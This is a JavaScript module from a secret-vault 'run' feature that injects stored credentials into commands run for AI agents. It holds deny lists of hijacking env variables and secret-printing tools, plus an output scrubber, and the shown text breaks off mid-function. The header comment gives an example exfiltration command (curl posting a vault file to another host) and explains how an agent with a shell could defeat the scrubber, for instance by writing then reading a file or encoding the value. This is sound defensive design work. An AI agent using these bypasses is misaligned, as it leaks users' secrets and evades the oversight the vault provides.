'use strict';
/**
 * A SECRET IN A COMMAND — the PURE half of `vibespace-vault run` (lane vault-run-model; design q-043 §8 + §5 P0-e — the owner
 * 2026-10-20: all five decisions as recommended). An agent never holds a stored value: it writes a REFERENCE where the value
 * goes, the hub resolves it and injects it into a child the HUB spawns, and the child's output comes back with every value —
 * and every form of it — scrubbed to `[vault:<store>/<row>/<field>]`. The door (route + the hub's spawn + the CLI + the card
 * + the audit + the lock's kill) is P0-f; this module is every RULE of it and no I/O:
 *
 *   · THE REFERENCE: `vault://<store>/<row>/<field>` — src/vault-inventory.js's `<store>:<entry>#<field>`, the row
 *     percent-encoded where it holds a character outside [A-Za-z0-9_.~:@+-]; `$VAULT{<store>/<row>/<field>}` inside a
 *     template; `$VAULT_FILE{<store>/<row>/<field>}` or `$VAULT_FILE{NAME}` (a `--file NAME=…`) in the command = the PATH of
 *     a 0600 file holding it (a path is not a secret) — `parseRef`, `scanRefs`, `renderTemplate`, `placeholderOf`. An
 *     AGENT'S OWN entry (lane vault-mint-put, design §9: `agent:<scope>/<name>` in the hub's secrets) is spelled the way
 *     `vibespace-vault mint|put` hands it out — `vault://agent:<scope>/<name>` (also `$VAULT{agent:…}`) — the same entry as
 *     `vault://secrets/agent:<scope>%2F<name>/secret`; only ITS conversation may reference it (`agentScopeOf`, lane vault-run-door).
 *   · THE INJECTION TABLE (`INJECTIONS`, `injectionOf`, `planOf`): env (`--env NAME=vault://…`, the default) → a 0600 file
 *     (`--file NAME=vault://…`, `--file NAME=@template` = `op inject`, `$VAULT_FILE{…}`) → stdin (`--stdin vault://…`: the
 *     value + a newline); a reference IN ARGV is REFUSED (`argv_refused`: /proc/<pid>/cmdline is readable by every user of
 *     the machine — lane vault-p1-secrets-off-argv's law); `--allow-argv` opens it only for a KNOWN tool marked argv-only
 *     (none today) and the plan says `argvExposed`. The agent's plain env may not name a library the tool loads, code an
 *     interpreter or shell runs first, a program the tool starts, a config it obeys, a proxy or PATH (`env_refused`); its
 *     NAMES are part of the shape.
 *   · THE REFUSAL TABLE (`TOOL_ROWS`, `refusedTool`): a tool (argv[0] resolved on the agent env's PATH, never the cwd — the
 *     door resolves, the resolved path is the shape's tool) that prints, transforms, packs or copies what it reads, records
 *     another process or wraps another tool is refused BY NAME (`tool_prints_secrets` · `tool_wraps_another`); VibeSpace's
 *     own CLIs and the agent browser reach the vault through their own doors (`tool_has_its_own_door`). A shell or an
 *     interpreter is not refused: its whole command line IS the shape, shown verbatim, never «always».
 *   · THE KNOWN TOOLS (`KNOWN_TOOLS`, §8.4): default hosts, where a tool's hosts come from (URLs, scp-like targets, an ssh
 *     target, a host flag, a registry), its subcommand words, whether it honours the proxy env (P1 vault-run-egress fences
 *     on it); a tool outside the table, or one naming no host = destination UNKNOWN (said on the card, never «always»).
 *   · THE SHAPE KEY (`shapeOf`, `shapeKeyOf`; decision ④): tool + flags (order-free) + hosts + entries + injection + the
 *     plain env (names AND values — lane vault-run-door: `PGHOST=evil` is another shape) + the templates' text + `--on`; a
 *     known tool's subcommand words belong to the tool, and so do the VALUES of its routing flags (`keyed`: ssh -o / -J /
 *     -F, curl -x / --resolve / --connect-to, git -c, rsync -e); every other positional is a CLASS (<path> <word> <number>
 *     <url> <vaultfile>) — a new file name is the same shape, a new host, flag, entry, route or subcommand is not. «always»
 *     is never offered for a shell, an interpreter, an unknown destination, a tool that runs the project's own code (npm,
 *     pip, docker), a config file the card cannot show (curl -K, ssh -F, kubectl --kubeconfig) or a program an agent could
 *     have written (`programWritable` — the door's fact).
 *   · THE VERDICT (`runVerdict`, §8.3): not set up / locked FIRST; the plan's and the tool's refusals; an entry with its own
 *     door (`OWN_DOORS`) / unknown / not opened for runs / too short to scrub; the conversation's grant; a remembered «always» for
 *     this shape; else a cluster ASKS every time (once / always / deny — the urgent card, 60 s) and a local instance asks the
 *     FIRST time a shape runs and allows it after one 允许 (`seen` — the owner's decision ②; still audited, still scrubbed).
 *   · THE SCRUBBER (`formsOf`, `createMasker`, `maskText`): a value and its five forms — raw; base64 (standard and URL-safe,
 *     padded or not, and the value's own characters at each of the three byte alignments it can take inside a longer
 *     base64 run: `Authorization: Basic base64(user:pass)`); percent-encoded (upper / lower hex; the encodeURIComponent,
 *     RFC 3986, path, WHATWG-form and every-byte spellings, `+` for a space); JSON-escaped (`\"`, `\/`, `\uXXXX`, the HTML-safe
 *     `<`); hex (upper / lower) — become its placeholder. A STREAM keeps back its last (longest form − 1) characters
 *     until the next chunk or its end, so a value split across chunks is still caught. A value under 8 bytes cannot be
 *     scrubbed safely and is never referenced (`entry_too_short_to_mask`).
 *
 * WHAT IT IS NOT — §8.6, the three holes, said where the code is:
 *   ① the child runs as the agent's uid today: the agent can read /proc/<child>/environ and the 0600 file while it runs —
 *     hygiene and an audit boundary, NOT isolation (q-040's per-run uid closes it; the hub spawns the child, never the
 *     CLI, so the shape does not change when it lands);
 *   ② a tool can SEND the value somewhere (`curl -d @$VAULT_FILE{x} https://elsewhere`): the card shows the hosts and the
 *     whole command; the egress fence is P1 (vault-run-egress);
 *   ③ THE SCRUBBER IS A SIEVE. It reads the child's stdout and stderr and catches the value in the forms above — nothing
 *     else: a custom encoding, compression, encryption, a reversal, a hash or an HMAC, the last four characters, MIME-wrapped
 *     base64, a value split between stdout and stderr all pass, and a value WRITTEN TO A FILE that the agent then `cat`s with
 *     its own shell never meets the scrubber at all — WRITE-THEN-CAT DEFEATS IT. The refusal table is a belt, not a proof.
 *     `run` stops ACCIDENTAL printing and a casual prompt injection; it does not stop a determined agent with a shell under
 *     the same uid — the same sentence q-040 says of per-session uids.
 *   (Not a hole, a boundary: the exit code, the duration and a file's size are never scrubbed.)
 *
 * PURE: imports only src/vault-inventory.js (the stores, the reference grammar) and src/vault-blocked.js (THE words of a
 * locked vault) — PURE → PURE. Gate: scripts/test-vault-run-model.mjs (every table + four mutants).
 */
const VI = require('./vault-inventory.js');
const VB = require('./vault-blocked.js');

const SCHEME = 'vault://';
const MIN_MASK_BYTES = 8;                        // a shorter value cannot be scrubbed without scrubbing ordinary text
const CMD_MAX = 4096;                            // bytes of the command line (exit run's bound)
const TEMPLATE_MAX = 65536;                      // bytes of one template (its text is part of the shape key)
const TIMEOUT_DEFAULT_S = 120;
const TIMEOUT_MAX_S = 600;
const OUTPUT_MAX_BYTES = 2 * 1024 * 1024;        // per run, the device's bound
const ASK_TTL_MS = 60000;                        // an unanswered card is refused by name (`ask_expired`, exit-proxy askOnce)
const ALWAYS_TTLS = Object.freeze({ '8h': 8 * 3600e3, '30d': 30 * 86400e3, forever: null });
const ALWAYS_DEFAULT = '30d';
const SHAPE_V = 'vr2';                           // a change of the key's spelling bumps it (every stored «always» asks again)
const SHAPE_NOTE = 'this shape = the tool + its flags + the hosts + the entries; positional arguments may change';

// ── THE WORDS (the code is the contract; the sentence is what an agent reads) ──
const WORDS = Object.freeze({
  vault_not_set_up: 'the vault is not set up on this instance — there is nothing to reference',
  vault_locked: VB.agentWords('a run waits until a person unlocks it on this instance\'s page'),
  bad_flag: 'usage: vibespace-vault run [--env NAME=vault://…] [--file NAME=vault://…|@template] [--stdin vault://…] [--allow-argv] [--on <machine>] [--timeout <s>] -- <command…>',
  bad_reference: 'a reference is vault://<store>/<row>/<field> (vibespace-vault list names the ones this conversation may use); in a template $VAULT{<store>/<row>/<field>}, in the command $VAULT_FILE{…} for a file\'s path',
  bad_env_name: 'an env name is letters, digits and _ (not starting with a digit)',
  duplicate_name: 'one NAME, one value — a name given twice is refused',
  env_refused: 'that variable would change what the tool loads, runs, obeys or reaches — refused by name',
  no_command: 'nothing to run — give the command after --',
  cmd_too_long: `the command is longer than ${CMD_MAX} bytes`,
  no_reference: 'the command references nothing in the vault — run it with your own shell',
  template_unread: 'the template was not read (the door hands its text in)',
  template_too_long: `a template is longer than ${TEMPLATE_MAX} bytes`,
  argv_refused: 'a value on the command line is visible to every user of the machine (/proc/<pid>/cmdline): pass it with --env NAME=vault://…, --file NAME=vault://… / $VAULT_FILE{…}, or --stdin vault://…',
  tool_prints_secrets: 'that tool prints, transforms, packs or copies what it reads — refused by name (a value would leave through its output or a file)',
  tool_wraps_another: 'that tool starts another one — run the tool itself (the run has its own timeout)',
  tool_has_its_own_door: 'VibeSpace\'s own CLIs and the agent browser reach the vault through their own doors',
  entry_has_its_own_door: 'that entry is never referenced by a run — it has its own door',
  entry_unknown: 'no such entry (vibespace-vault list names the ones this conversation may use)',
  entry_not_runnable: 'the user has not opened that entry for runs (⚙ System ▸ Vault…: the row\'s «Usable by agent runs», off by default) — ask the user in the chat to open it',
  entry_too_short_to_mask: `that value is shorter than ${MIN_MASK_BYTES} bytes and cannot be scrubbed from the output — it is never referenced`,
  use_not_granted: 'this conversation may not use that entry — ask the user in the chat',
  // ── THE DOOR's codes (lane vault-run-door, P0-f — src/server/vault-run-door.js) ──
  job_no_use: 'a Background Work job never runs with a stored secret — run it from the conversation itself',
  device_road_later: 'a run on a paired machine (a remote conversation, --on) is not here yet — a run starts on this instance only',
  cwd_refused: 'a run starts in the conversation\'s project folder, the temp folder or ~/Downloads — cd there first',
  tool_not_found: 'no such program on this instance\'s PATH (a bare name is never looked up in the current folder)',
  template_refused: 'a template is a regular file in the project folder, the temp folder or ~/Downloads',
  ask_pending: 'the same command shape already waits for the user\'s answer — wait for it, then run again',
  ask_denied: 'the user did not allow it — nothing ran',
  ask_expired: 'the user did not answer within 60 s — nothing ran; tell them in the chat, then run it again',
  ask_unfiled: 'the question could not be put in front of the user (For you refused it) — nothing ran; resolve your open For-you items first',
  ask_changed: 'the request changed after it was shown — nothing ran; run it again',
  caller_gone: 'the call went away while it waited — nothing ran',
  too_many_runs: 'too many runs at once — wait for one to end',
  spawn_failed: 'the program could not be started',
});
function refuse(code, extra = {}) { return { ok: false, code, words: WORDS[code] || code, ...extra }; }
const refusalOf = refuse;   // the door's refusals in the same shape (one spelling of a code and its words)

// ── THE REFERENCE ──
const ROW_KEEP = /[^\w.~:@+-]/g;
const encRow = (entry) => String(entry).replace(ROW_KEEP, (c) => encodeURIComponent(c).replace(/[!'()*]/g, (x) => '%' + x.charCodeAt(0).toString(16).toUpperCase()));
const REF_BODY = '([a-z][a-z0-9-]{0,31})/([\\w.~:@+%-]{1,720})/([\\w.:-]{1,160})';
const REF_EXACT = new RegExp(`^${REF_BODY}$`);
const REF_HEAD = new RegExp(`^vault://${REF_BODY}`);
const ENV_NAME = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;
// lane vault-run-door: an AGENT's own entry (lane vault-mint-put — src/vault.js AGENT_NS_RE: `agent:<scope>/<name>`, the
// secrets store, field `secret`) as its CLI hands it out: `vault://agent:<scope>/<name>`
const AGENT_BODY = 'agent:([A-Za-z0-9._:-]{1,128})/([A-Za-z0-9._-]{1,64})';
const AGENT_EXACT = new RegExp(`^${AGENT_BODY}$`), AGENT_HEAD = new RegExp(`^vault://${AGENT_BODY}`);
const AGENT_ENTRY = /^agent:([A-Za-z0-9._:-]{1,128})\/([A-Za-z0-9._-]{1,64})$/;
const isAgentEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && AGENT_ENTRY.test(String(entry));
function refOf(store, entry, field) {
  const id = VI.refOf(store, entry, field);
  if (!id) return null;
  const label = isAgentEntry(store, entry, field) ? String(entry) : `${store}/${encRow(entry)}/${field}`;   // an agent's own entry: its short spelling
  return Object.freeze({ store, entry, field, id, label, ref: SCHEME + label });
}
function bodyRef(store, row, field) { let entry; try { entry = decodeURIComponent(row); } catch { return null; } return refOf(store, entry, field); }
const agentRef = (scope, name) => refOf('secrets', `agent:${scope}/${name}`, 'secret');
/** A reference's body (after `vault://`, or inside `$VAULT{…}`) → the ref | null. */
function innerRef(body) { const m = REF_EXACT.exec(body); if (m) return bodyRef(m[1], m[2], m[3]); const a = AGENT_EXACT.exec(body); return a ? agentRef(a[1], a[2]) : null; }
/** `vault://<store>/<row>/<field>` or `vault://agent:<scope>/<name>` (the whole string) → { store, entry, field, id, label, ref } | null. */
function parseRef(s) {
  return typeof s === 'string' && s.startsWith(SCHEME) ? innerRef(s.slice(SCHEME.length)) : null;
}
/** An agent's own entry → the conversation that owns it (its scope); any other reference → null. */
const agentScopeOf = (ref) => { const m = ref && ref.store === 'secrets' && ref.field === 'secret' ? AGENT_ENTRY.exec(String(ref.entry)) : null; return m ? m[1] : null; };
const placeholderOf = (ref) => `[vault:${ref && ref.label ? ref.label : String(ref || '')}]`;
/** Every reference-shaped piece of `text` → { refs: [{ …ref, at, len, form: 'url' | 'brace' | 'file', name? }], bad: [{ at, text }] }.
 *  `form` url = `vault://…`; brace = `$VAULT{…}`; file = `$VAULT_FILE{…}` (`name` set when it names a `--file NAME`). A
 *  `vault://` / `$VAULT{` / `$VAULT_FILE{` in any letter case that does not parse is BAD — never read as plain text. */
function scanRefs(text) {
  const s = String(text == null ? '' : text);
  const refs = [], bad = [];
  const re = /vault:\/\/|\$vault(_file)?\{/gi;
  let m;
  while ((m = re.exec(s))) {
    const at = m.index;
    if (m[0][0] !== '$') {
      const h = m[0] === SCHEME ? REF_HEAD.exec(s.slice(at)) : null, ha = !h && m[0] === SCHEME ? AGENT_HEAD.exec(s.slice(at)) : null;
      const r = h ? bodyRef(h[1], h[2], h[3]) : ha ? agentRef(ha[1], ha[2]) : null;
      if (ha && r) { refs.push({ ...r, at, len: ha[0].length, form: 'url' }); re.lastIndex = at + ha[0].length; continue; }
      if (r) { refs.push({ ...r, at, len: h[0].length, form: 'url' }); re.lastIndex = at + h[0].length; } else bad.push({ at, text: s.slice(at, at + 80) });
      continue;
    }
    const file = !!m[1], close = s.indexOf('}', at), inner = close < 0 ? null : s.slice(at + m[0].length, close);
    const exact = m[0] === (file ? '$VAULT_FILE{' : '$VAULT{');
    const named = exact && file && inner != null && ENV_NAME.test(inner);
    const r = exact && inner != null && !named ? innerRef(inner) : null;
    if (named) refs.push({ at, len: close + 1 - at, form: 'file', name: inner });
    else if (r) refs.push({ ...r, at, len: close + 1 - at, form: file ? 'file' : 'brace' });
    else { bad.push({ at, text: s.slice(at, at + 80) }); continue; }
    re.lastIndex = close + 1;
  }
  return { refs, bad };
}
/** A template's `$VAULT{…}` rendered with `valueOf(ref)` (the door's last step — `op inject`). */
function renderTemplate(text, valueOf) {
  const s = String(text == null ? '' : text), { refs } = scanRefs(s);
  let out = '', i = 0;
  for (const r of refs) { if (r.form !== 'brace') continue; out += s.slice(i, r.at) + String(valueOf(r.ref)); i = r.at + r.len; }
  return out + s.slice(i);
}

// ── THE INJECTION TABLE (the order is the preference) ──
const INJECTIONS = Object.freeze([
  Object.freeze({ where: 'env', flag: '--env NAME=vault://…', open: true, seen: 'the child\'s environment (/proc/<pid>/environ — its own uid)', use: 'the default: a tool that reads a token from a variable (GH_TOKEN, PGPASSWORD, AWS_SECRET_ACCESS_KEY)' }),
  Object.freeze({ where: 'file', flag: '--file NAME=vault://… · --file NAME=@template · $VAULT_FILE{…}', open: true, seen: 'a 0600 file in a 0700 run directory, shredded when the child exits', use: 'a tool that reads only a file (curl -K, .npmrc, kubeconfig, my.cnf, ssh -i)' }),
  Object.freeze({ where: 'stdin', flag: '--stdin vault://…', open: true, seen: 'the child\'s stdin (the value + a newline)', use: 'docker login --password-stdin, gh auth login --with-token' }),
  Object.freeze({ where: 'argv', flag: '--allow-argv', open: false, seen: '/proc/<pid>/cmdline — every user of the machine', use: 'refused by default; --allow-argv opens it for a known argv-only tool only (audited argvExposed, a red line on the card)' }),
]);
/** → { ok, where, argvExposed } | refusal. `row` = the tool's KNOWN_TOOLS row. */
function injectionOf(where, { allowArgv = false, row = null } = {}) {
  const r = INJECTIONS.find((x) => x.where === where);
  if (!r) return refuse('bad_flag');
  if (r.open) return { ok: true, where, argvExposed: false };
  const argvOpen = !!allowArgv && !!(row && row.argvOnly);
  return argvOpen ? { ok: true, where, argvExposed: true } : refuse('argv_refused', { why: allowArgv ? 'not an argv-only tool' : 'refused by default' });
}

// ── THE PLAIN ENV an agent may not set (a belt: its NAMES are in the shape too) ──
const ENV_HIJACK = Object.freeze([
  Object.freeze({ re: /^(?:LD_\w*|DYLD_\w*)$/, why: 'the loader would load a library into the tool' }),
  Object.freeze({ re: /^(?:NODE_OPTIONS|NODE_PATH|PYTHONSTARTUP|PYTHONPATH|PYTHONHOME|PYTHONUSERBASE|PERL5OPT|PERL5LIB|PERLLIB|RUBYOPT|RUBYLIB|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS)$/, why: 'an interpreter would run other code first' }),
  Object.freeze({ re: /^(?:BASH_ENV|ENV|SHELLOPTS|BASHOPTS|PROMPT_COMMAND|PS4|IFS|ZDOTDIR|BASH_FUNC_\S*)$/, why: 'a shell would run other code first' }),
  Object.freeze({ re: /^(?:GIT_SSH|GIT_SSH_COMMAND|GIT_EXEC_PATH|GIT_ASKPASS|SSH_ASKPASS|GIT_PROXY_COMMAND|GIT_CONFIG\w*|EDITOR|VISUAL|PAGER|GIT_PAGER|GIT_EDITOR|MANPAGER|BROWSER|RSYNC_RSH|RSYNC_CONNECT_PROG)$/, why: 'the tool would start a program it names' }),
  Object.freeze({ re: /^PATH$/, why: 'the tool was resolved on the agent\'s PATH; another would change what it starts' }),
]);
const ENV_CONFIG = Object.freeze([   // a plain value pointing at the agent's own file is refused; a `--file NAME=…` the hub renders is not
  Object.freeze({ re: /^(?:KUBECONFIG|CURL_HOME|WGETRC|DOCKER_CONFIG|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|NPM_CONFIG_USERCONFIG|PIP_CONFIG_FILE|PGSERVICEFILE|PGPASSFILE|RCLONE_CONFIG|NETRC)$/i, why: 'it points the tool at a config it obeys' }),
  Object.freeze({ re: /^(?:HOME|XDG_CONFIG_HOME|XDG_DATA_HOME|XDG_CACHE_HOME)$/, why: 'it moves the home a tool reads its config from' }),   // lane vault-run-door (the security review)
  Object.freeze({ re: /^(?:https?_proxy|all_proxy|no_proxy|ftp_proxy)$/i, why: 'where a run may go is the hub\'s (vault-run-egress)' }),
]);
/** NAME → why it is refused, or null. `as` = 'plain' | 'env' (a value) | 'file' (a path the hub renders). */
function envRefusedOf(name, as = 'plain') {
  const n = String(name || '');
  const h = ENV_HIJACK.find((r) => r.re.test(n));
  if (h) return h.why;
  const c = as === 'file' ? null : ENV_CONFIG.find((r) => r.re.test(n));
  return c ? c.why : null;
}

// ── THE REFUSAL TABLE (argv[0], resolved) ──
const TOOL_ROWS = Object.freeze([
  Object.freeze({ cls: 'print', code: 'tool_prints_secrets', names: ['echo', 'printf', 'cat', 'tac', 'nl', 'tee', 'head', 'tail', 'less', 'more', 'most', 'pg', 'bat', 'batcat', 'view', 'env', 'printenv', 'export', 'set', 'declare', 'typeset', 'readonly', 'strings', 'column', 'pr', 'fmt', 'jq', 'yq', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'diff', 'cmp', 'sort', 'uniq', 'look', 'zcat', 'bzcat', 'xzcat', 'zstdcat', 'lz4cat', 'zless', 'zmore', 'vi', 'vim', 'nvim', 'nano', 'emacs', 'ed', 'ex', 'pico', 'micro'] }),
  Object.freeze({ cls: 'transform', code: 'tool_prints_secrets', names: ['xxd', 'od', 'hexdump', 'hd', 'base64', 'base32', 'basenc', 'uuencode', 'uudecode', 'rev', 'tr', 'cut', 'fold', 'paste', 'sed', 'gsed', 'awk', 'gawk', 'mawk', 'nawk', 'iconv', 'recode', 'md5sum', 'sha1sum', 'sha224sum', 'sha256sum', 'sha384sum', 'sha512sum', 'b2sum', 'cksum', 'sum', 'shasum'] }),
  Object.freeze({ cls: 'pack', code: 'tool_prints_secrets', names: ['gzip', 'gunzip', 'bzip2', 'bunzip2', 'xz', 'unxz', 'lzma', 'unlzma', 'zstd', 'unzstd', 'lz4', 'zip', 'unzip', 'tar', '7z', '7za', '7zr', 'rar', 'unrar', 'cpio', 'ar', 'pax', 'openssl', 'gpg', 'gpg2', 'age'] }),
  Object.freeze({ cls: 'copy', code: 'tool_prints_secrets', names: ['cp', 'mv', 'dd', 'install', 'ln', 'link', 'split', 'csplit'] }),
  Object.freeze({ cls: 'trace', code: 'tool_prints_secrets', names: ['strace', 'ltrace', 'gdb', 'lldb', 'perf', 'valgrind', 'bpftrace', 'script'] }),
  Object.freeze({ cls: 'wrapper', code: 'tool_wraps_another', names: ['sudo', 'doas', 'su', 'runuser', 'sg', 'newgrp', 'nice', 'ionice', 'nohup', 'timeout', 'time', 'stdbuf', 'setsid', 'xargs', 'parallel', 'watch', 'flock', 'chroot', 'unshare', 'nsenter', 'busybox', 'toybox', 'command', 'exec', 'builtin', 'eval', 'taskset', 'chrt', 'systemd-run', 'firejail', 'bwrap', 'proot', 'fakeroot'] }),
  Object.freeze({ cls: 'door', code: 'tool_has_its_own_door', names: ['agent-browser'], prefix: 'vibespace-' }),
]);
const REFUSING = TOOL_ROWS;
const SHELLS = Object.freeze(['sh', 'bash', 'zsh', 'dash', 'ksh', 'mksh', 'ash', 'fish', 'csh', 'tcsh', 'pwsh', 'powershell', 'cmd']);
const INTERPRETERS = Object.freeze(['node', 'nodejs', 'deno', 'bun', 'python', 'pypy', 'perl', 'ruby', 'php', 'lua', 'luajit', 'tclsh', 'wish', 'rscript', 'julia', 'java', 'dotnet']);   // a Mac's interpreters come with the device road (P1 vault-run-device)

// ── THE KNOWN TOOLS (§8.4 — P1 vault-run-egress fences the `proxyEnv` ones) ──
const SSH_VALUE_FLAGS = ['-b', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m', '-O', '-o', '-p', '-P', '-Q', '-R', '-S', '-W', '-w', '-B'];
const SSH_KEYED = ['-o', '-F', '-J', '-W', '-L', '-R', '-D', '-S'];   // lane vault-run-door: where the connection goes / what it runs (ProxyCommand) — the value is the shape
const KNOWN_TOOLS = Object.freeze([
  { name: 'curl', proxyEnv: true, valueFlags: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config'], keyed: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url'], configFlags: ['-K', '--config'] },
  { name: 'wget', proxyEnv: true },
  { name: 'http', aka: ['https', 'httpie'], proxyEnv: true },
  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'] },
  { name: 'git', sub: 1, scpLike: true, proxyEnv: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
  { name: 'aws', hosts: ['*.amazonaws.com'], sub: 2, proxyEnv: true, valueFlags: ['--profile', '--region', '--output'] },
  { name: 'gcloud', hosts: ['*.googleapis.com'], sub: 3, proxyEnv: true, valueFlags: ['--project', '--account', '--format', '--configuration'] },
  { name: 'az', hosts: ['management.azure.com', 'login.microsoftonline.com'], sub: 2, proxyEnv: true, valueFlags: ['--subscription', '-g', '--resource-group', '-o', '--output'] },
  { name: 'npm', hosts: ['registry.npmjs.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'pip', hosts: ['pypi.org', 'files.pythonhosted.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'docker', hosts: ['registry-1.docker.io'], sub: 1, registry: true, proxyEnv: false, runsProject: true },
  { name: 'kubectl', sub: 1, proxyEnv: true, valueFlags: ['-n', '--namespace', '--context', '--cluster', '--user', '-o', '--output', '-l', '--selector', '-f', '--filename', '-c', '--container', '--kubeconfig', '-s', '--server'], configFlags: ['--kubeconfig'] },
  { name: 'psql', hostFlags: ['-h', '--host'], hostEnv: ['PGHOST', 'PGHOSTADDR'], proxyEnv: false },
  { name: 'mysql', hostFlags: ['-h', '--host'], hostEnv: ['MYSQL_HOST'], proxyEnv: false },
  { name: 'rclone', sub: 1, proxyEnv: true },
  { name: 'ssh', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'sftp', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'scp', scpLike: true, copies: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'rsync', scpLike: true, copies: true, proxyEnv: false, valueFlags: ['-e', '--rsh'], keyed: ['-e', '--rsh'] },
].map((r) => Object.freeze({ argvOnly: false, ...r })));

/** argv[0] (and the door's resolution of it) → its lookup name: the basename, lower case, no `.exe`. */
const toolNameOf = (argv0, resolved = null) => String(resolved || argv0 || '').split(/[\\/]/).pop().toLowerCase().replace(/\.exe$/, '');
const findIn = (list, n, key = (r) => r.names) => list.find((r) => key(r).includes(n)) || list.find((r) => key(r).includes(n.replace(/[\d.]+$/, ''))) || null;
const knownToolOf = (name) => (name ? findIn(KNOWN_TOOLS, name, (r) => [r.name, ...(r.aka || [])]) : null);
/** → { code, cls, name, words } | null. */
function refusedTool(argv0, { resolved = null } = {}) {
  const name = toolNameOf(argv0, resolved);
  if (!name) return refuse('no_command');
  const row = findIn(REFUSING, name) || REFUSING.find((r) => r.prefix && name.startsWith(r.prefix)) || null;
  return row ? refuse(row.code, { cls: row.cls, tool: name }) : null;
}
/** 'shell' | 'interpreter' | 'tool' — a shell's or an interpreter's whole command line is its program. */
function toolKindOf(name) { const n = String(name || ''); return SHELLS.includes(n) || SHELLS.includes(n.replace(/[\d.]+$/, '')) ? 'shell' : INTERPRETERS.includes(n) || INTERPRETERS.includes(n.replace(/[\d.]+$/, '')) ? 'interpreter' : 'tool'; }

// ── THE PLAN (the request → what the child gets; every refusal by name) ──
const bytesOf = (s) => { let n = 0; for (const ch of String(s)) { const c = ch.codePointAt(0); n += c < 0x80 ? 1 : c < 0x800 ? 2 : c < 0x10000 ? 3 : 4; } return n; };
const pairsOf = (x) => (Array.isArray(x) ? x.map((p) => (Array.isArray(p) ? [String(p[0]), String(p[1] == null ? '' : p[1])] : [String(p && p.name), String(p && p.value != null ? p.value : '')])) : x && typeof x === 'object' ? Object.entries(x).map(([k, v]) => [k, String(v == null ? '' : v)]) : []);
/** The CLI's words → the request. `vibespace-vault run [--env NAME=V]… [--file NAME=vault://…|@template]… [--stdin vault://…]
 *  [--allow-argv] [--on <machine>] [--timeout <s>] [--] <command…>` → { ok, req } | refusal. */
const RUN_FLAGS = Object.freeze(['--env', '--file', '--stdin', '--allow-argv', '--on', '--timeout']);
function timeoutOf(v) { const n = Number(v); return /^\d{1,4}$/.test(String(v)) && n >= 1 && n <= TIMEOUT_MAX_S ? n : null; }
function parseRunArgs(args) {
  const a = (Array.isArray(args) ? args : []).map(String);
  const req = { argv: [], env: [], file: [], stdin: null, allowArgv: false, on: null, timeoutSec: TIMEOUT_DEFAULT_S };
  let i = 0;
  for (; i < a.length; i++) {
    const x = a[i];
    if (x === '--') { i++; break; }
    if (!x.startsWith('--')) break;
    const eq = x.indexOf('='), flag = eq > 0 ? x.slice(0, eq) : x;
    if (!RUN_FLAGS.includes(flag)) return refuse('bad_flag', { flag });
    if (flag === '--allow-argv') { if (eq > 0) return refuse('bad_flag', { flag }); req.allowArgv = true; continue; }
    const v = eq > 0 ? x.slice(eq + 1) : i + 1 < a.length ? a[++i] : null;
    if (v == null) return refuse('bad_flag', { flag });
    if (flag === '--env' || flag === '--file') { const k = v.indexOf('='); if (k < 1) return refuse('bad_flag', { flag }); req[flag.slice(2)].push([v.slice(0, k), v.slice(k + 1)]); }
    else if (flag === '--stdin') { if (req.stdin != null) return refuse('bad_flag', { flag }); req.stdin = v; }
    else if (flag === '--on') req.on = v;
    else { const t = timeoutOf(v); if (t == null) return refuse('bad_flag', { flag }); req.timeoutSec = t; }
  }
  req.argv = a.slice(i);
  return { ok: true, req };
}
/**
 * The request → THE PLAN, or a refusal. `req` = { argv, env, file, stdin, allowArgv, on, resolved, templates } — `env` / `file`
 * as [[NAME, value]] (or { NAME: value }); `resolved` = argv[0] on the agent env's PATH (the door's lookup); `templates` =
 * { <path>: text } for every `--file NAME=@<path>` (the door reads them inside the cwd fence); `timeoutSec` 1–600 (120).
 * → { ok: true, argv, tool, name, kind, row, refs: [ref…], env: [{ name, ref }], plainEnv: [{ name, value }],
 *     files: [{ slot, name|null, ref|null, template|null, text|null }], stdin: ref|null, injection: [..], argvExposed, on, timeoutSec }
 */
function planOf(req = {}) {
  const argv = Array.isArray(req.argv) ? req.argv.map(String) : [];
  if (!argv.length || !argv[0]) return refuse('no_command');
  if (bytesOf(argv.join(' ')) > CMD_MAX) return refuse('cmd_too_long');
  const tr = refusedTool(argv[0]) || (req.resolved ? refusedTool(argv[0], { resolved: req.resolved }) : null);   // lane vault-run-door: the typed name AND the resolved path's
  if (tr) return tr;
  const name = toolNameOf(argv[0], req.resolved), row = knownToolOf(name);
  const refs = new Map(), names = new Set(), env = [], plainEnv = [], files = [], injection = [];
  const add = (r) => { if (!refs.has(r.id)) refs.set(r.id, refOf(r.store, r.entry, r.field)); return refs.get(r.id).ref; };
  const claim = (n, as) => {
    if (!ENV_NAME.test(n)) return refuse('bad_env_name', { name: n });
    if (names.has(n)) return refuse('duplicate_name', { name: n });
    const why = envRefusedOf(n, as);
    if (why) return refuse('env_refused', { name: n, why });
    names.add(n); return null;
  };
  for (const [n, v] of pairsOf(req.env)) {
    const sc = scanRefs(v);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    const r = sc.refs.length ? parseRef(v) : null;
